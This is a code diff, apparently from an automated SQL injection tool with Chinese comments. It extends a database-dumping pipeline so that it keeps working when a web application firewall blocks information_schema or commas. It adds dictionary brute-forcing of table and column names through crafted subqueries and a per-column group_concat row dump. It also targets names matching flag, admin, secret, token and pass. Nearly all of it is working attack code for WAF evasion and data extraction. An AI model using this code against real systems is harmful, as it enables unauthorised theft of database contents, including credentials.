@@ -20,6 +20,22 @@ INTERESTING = re.compile(r"flag|user|admin|secret|key|pass|token|config", re.I)
 # 系统库不参与业务脱库
 SYSTEM_DBS = {"information_schema", "mysql", "performance_schema", "sys", "test"}
 
+_BRUTE: dict | None = None
+
+
+def _brute_dict() -> dict:
+    """存在性爆破字典（information_schema 被拦时的表名/列名候选）。"""
+    global _BRUTE
+    if _BRUTE is None:
+        import yaml
+        from .waf import DICT_DIR
+        try:
+            with open(DICT_DIR / "bruteforce.yaml", encoding="utf-8") as f:
+                _BRUTE = yaml.safe_load(f) or {}
+        except OSError:
+            _BRUTE = {}
+    return _BRUTE
+
 
 @dataclass
 class DumpResult:
@@ -100,6 +116,27 @@ class ExtractionPipeline:
             items.append(v)
         return items
 
+    def _brute(self, what: str, expr_fmt: str, words: list) -> list:
+        """存在性爆破底座：逐词构造「存在→值 0 / 不存在→报错」子查询。
+        连续失败（通道失效/大量词被拦）达阈值则中止，避免刷屏。"""
+        if not hasattr(self.o, "exists"):
+            return []
+        found, fail = [], 0
+        for w in words:
+            if self.s.stopped:
+                break
+            try:
+                if self.o.exists(expr_fmt.format(w=w)):
+                    found.append(w)
+                    self.log("INFO", f"[脱库] 字典爆破命中{what}: {w}")
+                fail = 0
+            except OracleError as e:
+                fail += 1
+                if fail >= 5:
+                    self.log("WARN", f"[脱库] {what}名爆破通道连续失效，中止: {str(e)[:60]}")
+                    break
+        return found
+
     def list_databases(self) -> list:
         if self.dialect.name == "sqlite":
             return ["main"]
@@ -121,6 +158,14 @@ class ExtractionPipeline:
                            "SQLite 用 sqlite_master 代替 information_schema")
                 return [x for x in raw.split(",") if x] if raw else []
             return self._slow_list("name", where)
+        if self.waf.is_filtered("information_schema"):
+            # information_schema 含 or 子串等被拦 → 常用表名存在性爆破兜底
+            fmt = f"(select(0)from({db}.{{w}}))" if db else "(select(0)from({w}))"
+            tables = self._brute("表", fmt, _brute_dict().get("tables", []))
+            if tables:
+                self._note("字典爆破表名（information_schema 被拦）",
+                           f"{db} 的表: {tables}")
+            return tables
         lit = self.b.str_lit(db)
         where = f"information_schema.tables where table_schema={lit}"
         if self._can_group_concat():
@@ -137,6 +182,15 @@ class ExtractionPipeline:
             ddl = self.o.scalar(self.dialect.get_ddl.format(lit=lit))
             cols = parse_create_table_columns(ddl) if ddl else []
             self.log("INFO", f"[脱库] {table} 的列(SQLite DDL 解析): {cols}")
+            return cols
+        if self.dialect.name == "mysql" and self.waf.is_filtered("information_schema"):
+            # 派生表子查询存在性爆破：列不存在 → SQL 报错；存在 → 值 0
+            full = f"{db}.{table}" if db and db != "main" else table
+            fmt = f"(select(0)from(select({{w}})from({full}))t)"
+            cols = self._brute("列", fmt, _brute_dict().get("columns", []))
+            if cols:
+                self._note("字典爆破列名（information_schema 被拦）",
+                           f"{full} 的列: {cols}")
             return cols
         # 单条件 table_name 最通用：FinalSQL 类强 WAF 拦 and 双条件与 0x hex 字面量
         lit = self.b.str_lit(table)
@@ -171,6 +225,10 @@ class ExtractionPipeline:
     # ------------------------------------------------------------------ data
     def dump_rows(self, db: str, table: str, columns: list,
                   max_rows: int = 20) -> list:
+        if self.waf.is_filtered(","):
+            # 逗号被拦：concat_ws 多列与 limit 分页均不可构造 → 逐列 group_concat
+            # （单列 group_concat 无逗号，配合 arith 括号化无空格）
+            return self._dump_rows_percol(db, table, columns, max_rows)
         # limit 依赖空格/tab（严格形态下不可用）→ group_concat 全量导出（紧凑无空格）
         try:
             return self._dump_rows_concatws(db, table, columns, max_rows)
